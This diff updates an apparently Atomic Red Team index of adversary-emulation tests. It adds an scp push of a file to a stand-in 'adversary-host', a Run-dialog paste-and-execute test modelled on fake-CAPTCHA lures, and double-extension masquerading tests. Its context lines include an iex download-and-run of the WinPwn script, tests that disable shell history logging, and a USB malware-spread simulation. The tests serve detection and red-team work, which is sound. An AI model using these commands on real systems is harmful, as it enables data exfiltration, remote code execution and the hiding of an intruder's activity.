@@ -1096,6 +1096,75 @@ input_arguments.target_filename.type: string
 input_arguments.target_filename.default: T1105_scp.zip
 
 "
+T1105,Ingress Tool Transfer,Windows push file using scp.exe,2a4b0d29-e5dd-4b66-b729-07423ba1cd9d,"This test simulates pushing files using SCP on a Windows environment.
+",windows,,,"# Check if the folder exists, create it if it doesn't
+$folderPath = ""#{local_path}""
+if (-Not (Test-Path -Path $folderPath)) {
+    New-Item -Path $folderPath -ItemType Directory
+}
+
+# Create the file
+$filePath = Join-Path -Path $folderPath -ChildPath ""#{file_name}""
+New-Item -Path $filePath -ItemType File -Force
+Write-Output ""File created: $filePath""
+
+# Attack command
+scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}
+",powershell,True,,"$filePath = Join-Path -Path ""#{local_path}"" -ChildPath ""#{file_name}""
+Remove-Item -Path $filePath -Force -erroraction silentlycontinue
+Write-Output ""File deleted: $filePath""
+",powershell,"dependencies.0.description: This test requires the `scp` command to be available on the system.
+
+dependencies.0.prereq_command: if (Get-Command scp -ErrorAction SilentlyContinue) {
+    Write-Output ""SCP command is available.""
+    exit 0
+} else {
+    Write-Output ""SCP command is not available.""
+    exit 1
+}
+
+dependencies.0.get_prereq_command: # Define the capability name for OpenSSH Client
+$capabilityName = ""OpenSSH.Client~~~~0.0.1.0""
+try {
+    # Install the OpenSSH Client capability
+    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+    Write-Host ""OpenSSH Client has been successfully installed."" -ForegroundColor Green
+} catch {
+    # Handle any errors that occur during the installation process
+    Write-Host ""An error occurred while installing OpenSSH Client: $_"" -ForegroundColor Red
+}
+
+","input_arguments.remote_path.description: Path of folder to copy
+
+input_arguments.remote_path.type: path
+
+input_arguments.remote_path.default: /tmp/
+
+input_arguments.remote_host.description: Remote host to send
+
+input_arguments.remote_host.type: string
+
+input_arguments.remote_host.default: adversary-host
+
+input_arguments.local_path.description: Local path to copy from
+
+input_arguments.local_path.type: path
+
+input_arguments.local_path.default: C:\temp
+
+input_arguments.file_name.description: Name of the file to transfer
+
+input_arguments.file_name.type: string
+
+input_arguments.file_name.default: T1105.txt
+
+input_arguments.username.description: User account to authenticate on remote host
+
+input_arguments.username.type: string
+
+input_arguments.username.default: adversary
+
+"
 T1006,Direct Volume Access,Read volume boot sector via DOS device path (PowerShell),88f6327e-51ec-4bbf-b2e8-3fea534eab8b,"This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
 On success, a hex dump of the first 11 bytes of the volume is displayed.
 
@@ -8861,69 +8930,6 @@ C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
 ",command_prompt,True,,"del C:\T1036.003.txt >nul 2>&1
 del C:\lsm.exe >nul 2>&1
 ",,,
-T1036.003,Masquerading: Rename System Utilities,File Extension Masquerading,c7fa0c3b-b57f-4cba-9118-863bf4e653fc,"download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.
-
-e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)
-",windows,,,"copy ""#{exe_path}"" %temp%\T1036.003_masquerading.docx.exe /Y
-copy ""#{exe_path}"" %temp%\T1036.003_masquerading.pdf.exe /Y
-copy ""#{exe_path}"" %temp%\T1036.003_masquerading.ps1.exe /Y
-copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.xls.vbs /Y
-copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.xlsx.vbs /Y
-copy ""#{vbs_path}"" %temp%\T1036.003_masquerading.png.vbs /Y
-copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.doc.ps1 /Y
-copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.pdf.ps1 /Y
-copy ""#{ps1_path}"" %temp%\T1036.003_masquerading.rtf.ps1 /Y
-%temp%\T1036.003_masquerading.docx.exe
-%temp%\T1036.003_masquerading.pdf.exe
-%temp%\T1036.003_masquerading.ps1.exe
-%temp%\T1036.003_masquerading.xls.vbs
-%temp%\T1036.003_masquerading.xlsx.vbs
-%temp%\T1036.003_masquerading.png.vbs
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
-",command_prompt,,,"del /f %temp%\T1036.003_masquerading.docx.exe > nul 2>&1
-del /f %temp%\T1036.003_masquerading.pdf.exe > nul 2>&1
-del /f %temp%\T1036.003_masquerading.ps1.exe > nul 2>&1
-del /f %temp%\T1036.003_masquerading.xls.vbs > nul 2>&1
-del /f %temp%\T1036.003_masquerading.xlsx.vbs > nul 2>&1
-del /f %temp%\T1036.003_masquerading.png.vbs > nul 2>&1
-del /f %temp%\T1036.003_masquerading.doc.ps1 > nul 2>&1
-del /f %temp%\T1036.003_masquerading.pdf.ps1 > nul 2>&1
-del /f %temp%\T1036.003_masquerading.rtf.ps1 > nul 2>&1
-",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{vbs_path})
-
-dependencies.0.prereq_command: if (Test-Path ""#{vbs_path}"") {exit 0} else {exit 1}
-
-dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vbs_path}"") -ErrorAction ignore | Out-Null
-Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"" -OutFile ""#{vbs_path}""
-
-dependencies.1.description: File to copy must exist on disk at specified location (#{ps1_path})
-
-dependencies.1.prereq_command: if (Test-Path ""#{ps1_path}"") {exit 0} else {exit 1}
-
-dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{ps1_path}"") -ErrorAction ignore | Out-Null
-Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.ps1"" -OutFile ""#{ps1_path}""
-
-","input_arguments.exe_path.description: path to exe to use when creating masquerading files
-
-input_arguments.exe_path.type: path
-
-input_arguments.exe_path.default: C:\Windows\System32\calc.exe
-
-input_arguments.vbs_path.description: path of vbs to use when creating masquerading files
-
-input_arguments.vbs_path.type: path
-
-input_arguments.vbs_path.default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.vbs
-
-input_arguments.ps1_path.description: path of powershell script to use when creating masquerading files
-
-input_arguments.ps1_path.type: path
-
-input_arguments.ps1_path.default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.ps1
-
-"
 T1647,Plist File Modification,Plist Modification,394a538e-09bb-4a4a-95d1-b93cf12682a8,"Modify MacOS plist file in one of two directories
 ",macos,,,,manual,,"1. Modify a .plist in
 
@@ -10030,6 +10036,31 @@ Reference: https://x.com/NickTyrer/status/914234924655312896",windows,,,"Scriptr
 input_arguments.payload_path.type: String
 
 input_arguments.payload_path.default: C:\Windows\System32\calc.exe
+
+"
+T1202,Indirect Command Execution,Indirect Command Execution - RunMRU Dialog,de323a93-2f18-4bd5-ba60-d6fca6aeff76,"Simulates execution of commands via the Windows Run dialog (Win+R) by programmatically opening the Run dialog, 
+copying a command to clipboard, and automating the paste and execution. This generates artifacts in the RunMRU registry key,
+which is commonly abused by threat actors to execute malicious commands disguised as CAPTCHA verification steps.
+Upon execution, a test PowerShell command will be executed through the Run dialog.
+",windows,,,"# Copy command to clipboard
+Set-Clipboard -Value '#{command}'
+
+# Open Run dialog
+Start-Process -FilePath ""powershell"" -ArgumentList ""-c (New-Object -ComObject 'Shell.Application').FileRun()"" -WindowStyle Hidden
+
+# Wait for Run dialog to open
+Start-Sleep -Seconds 1
+
+# Paste command and execute
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.SendKeys]::SendWait('^v')
+Start-Sleep -Milliseconds 500
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+",powershell,,,,,,"input_arguments.command.description: Command to execute via Run dialog
+
+input_arguments.command.type: string
+
+input_arguments.command.default: calc.exe
 
 "
 T1027.006,HTML Smuggling,HTML Smuggling Remote Payload,30cbeda4-08d9-42f1-8685-197fad677734,"The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. 
@@ -12412,6 +12443,69 @@ dependencies.0.prereq_command: if [ $(command -v auditctl) ]; then exit 0; else 
 dependencies.0.get_prereq_command: (yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)
 
 ",
+T1036.007,Masquerading: Double File Extension,File Extension Masquerading,c7fa0c3b-b57f-4cba-9118-863bf4e653fc,"download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.
+
+e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)
+",windows,,,"copy ""#{exe_path}"" %temp%\T1036.007_masquerading.docx.exe /Y
+copy ""#{exe_path}"" %temp%\T1036.007_masquerading.pdf.exe /Y
+copy ""#{exe_path}"" %temp%\T1036.007_masquerading.ps1.exe /Y
+copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.xls.vbs /Y
+copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.xlsx.vbs /Y
+copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.png.vbs /Y
+copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.doc.ps1 /Y
+copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.pdf.ps1 /Y
+copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.rtf.ps1 /Y
+%temp%\T1036.007_masquerading.docx.exe
+%temp%\T1036.007_masquerading.pdf.exe
+%temp%\T1036.007_masquerading.ps1.exe
+%temp%\T1036.007_masquerading.xls.vbs
+%temp%\T1036.007_masquerading.xlsx.vbs
+%temp%\T1036.007_masquerading.png.vbs
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1
+",command_prompt,,,"del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1
+del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1
+del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1
+del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1
+del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1
+del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1
+del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1
+del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1
+del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1
+",powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{vbs_path})
+
+dependencies.0.prereq_command: if (Test-Path ""#{vbs_path}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vbs_path}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.007/src/T1036.007_masquerading.vbs"" -OutFile ""#{vbs_path}""
+
+dependencies.1.description: File to copy must exist on disk at specified location (#{ps1_path})
+
+dependencies.1.prereq_command: if (Test-Path ""#{ps1_path}"") {exit 0} else {exit 1}
+
+dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{ps1_path}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.007/src/T1036.007_masquerading.ps1"" -OutFile ""#{ps1_path}""
+
+","input_arguments.exe_path.description: path to exe to use when creating masquerading files
+
+input_arguments.exe_path.type: path
+
+input_arguments.exe_path.default: C:\Windows\System32\calc.exe
+
+input_arguments.vbs_path.description: path of vbs to use when creating masquerading files
+
+input_arguments.vbs_path.type: path
+
+input_arguments.vbs_path.default: PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.vbs
+
+input_arguments.ps1_path.description: path of powershell script to use when creating masquerading files
+
+input_arguments.ps1_path.type: path
+
+input_arguments.ps1_path.default: PathToAtomicsFolder\T1036.007\src\T1036.007_masquerading.ps1
+
+"
 T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - FreeBSD/Linux/macOS,562d737f-2fc6-4b09-8c2a-7f8ff0828480,"Delete a single file from the temporary directory
 ",linux,macos,,"rm -f #{file_to_delete}
 ",sh,,,"rm -rf #{parent_folder}
@@ -14793,7 +14887,6 @@ if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth"
 history -c 
 ls -la $HISTFILE # "" ls -la $HISTFILE""
 if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi
-# -> ls -la is not in history cache
 if [ ""$HISTCONTROL"" != ""erasedups"" ]; then export HISTCONTROL=""erasedups""; fi
 history -c 
 ls -la $HISTFILE
@@ -14808,8 +14901,10 @@ Note: we don't wish to log out, so we are just confirming the value of HISTFILES
 ",linux,,,"TEST=$(echo $HISTFILESIZE)
 echo $HISTFILESIZE
 export HISTFILESIZE=0
-if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; fi
-# -> $HISTFILESIZE is zero
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi
 ",bash,False,,"export HISTCONTROL=$(echo $TEST)
 ",,,
 T1562.003,Impair Defenses: Impair Command History Logging,Setting the HISTSIZE environment variable,386d3850-2ce7-4508-b56b-c0558922c814,"An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.
@@ -14817,8 +14912,10 @@ T1562.003,Impair Defenses: Impair Command History Logging,Setting the HISTSIZE e
 Note: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.
 ",linux,,,"echo $HISTSIZE
 export HISTSIZE=0
-if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; fi
-# -> $HISTSIZE is zero
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH"";  fi
 ",sh,False,,"export HISTSIZE=100
 ",,,
 T1562.003,Impair Defenses: Impair Command History Logging,Setting the HISTFILE environment variable,b3dacb6c-a9e3-44ec-bf87-38db60c5cad1,"An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.
@@ -14827,8 +14924,10 @@ Note: we don't wish to log out, so we are just confirming the value of HISTFILE.
 ",linux,,,"TEST=$(echo $HISTFILE)
 echo $HISTFILE
 export HISTFILE=""/dev/null""
-if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
-# -> $HISTFILE is /dev/null
+echo ""runnning some commands to populate the history""
+whoami
+groups
+if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT"";  fi
 ",bash,False,,"export HISTFILE=$(echo $TEST)
 ",,,
 T1562.003,Impair Defenses: Impair Command History Logging,Setting the HISTFILE environment variable (freebsd),f7308845-6da8-468e-99f2-4271f2f5bb67,"An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.
@@ -14837,7 +14936,6 @@ Note: we don't wish to log out, so we are just confirming the value of HISTFILE.
 ",linux,,,"echo $HISTFILE
 export HISTFILE=""/dev/null""
 if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
-# -> $HISTFILE is /dev/null
 ",sh,False,,"export HISTFILE=~/.sh_history
 ",,,
 T1562.003,Impair Defenses: Impair Command History Logging,Setting the HISTIGNORE environment variable,f12acddb-7502-4ce6-a146-5b62c59592f1,"An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. 
@@ -14849,7 +14947,6 @@ ls -la $HISTFILE
 ls -la ~/.bash_logout
 if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi
 unset HISTIGNORE
-
 if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
 history -c 
 whoami
@@ -20125,6 +20222,11 @@ T1120,Peripheral Device Discovery,WinPwn - printercheck,cb6e76ca-861e-4a7f-be08-
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 printercheck -noninteractive -consoleoutput",powershell,,,,,,
 T1120,Peripheral Device Discovery,Peripheral Device Discovery via fsutil,424e18fd-48b8-4201-8d3a-bf591523a686,Performs pheripheral device discovery utilizing fsutil to list all drives.,windows,,,fsutil fsinfo drives,command_prompt,,,,,,
+T1120,Peripheral Device Discovery,Get Printer Device List via PowerShell Command,5c876daf-db1e-41cf-988d-139a7443ccd4,"This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to 
+gather details on connected devices. Using Get-Printer, they can view information on all available printers, identifying 
+potential devices for further targeting.
+",windows,,,"Get-Printer
+",powershell,,,,,,
 T1091,Replication Through Removable Media,USB Malware Spread Simulation,d44b7297-622c-4be8-ad88-ec40d7563c75,"Simulates an adversary copying malware to all connected removable drives. 
 ",windows,,,"$RemovableDrives=@()
 $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID
